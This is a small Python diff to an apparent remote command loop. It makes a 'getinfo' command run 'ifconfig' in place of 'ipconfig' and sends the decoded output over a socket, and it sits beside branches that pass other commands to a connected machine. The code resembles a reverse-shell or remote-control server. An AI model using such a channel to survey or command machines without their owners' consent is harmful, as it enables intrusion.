@@ -94,9 +94,9 @@ def start_prompt():
                     if cmd == 'quit':
                         break
                     elif cmd == 'getinfo':
-                        p = subprocess.check_output("ipconfig")
+                        p = subprocess.check_output("ifconfig").decode("utf-8")
                         print(p, end="")
-                        conn.send(p)
+                        conn.send(str.encode(p, "utf-8"))
                         client_response = str(conn.recv(20480))
                         print(client_response)
                     elif len(str.encode(cmd)) > 0:
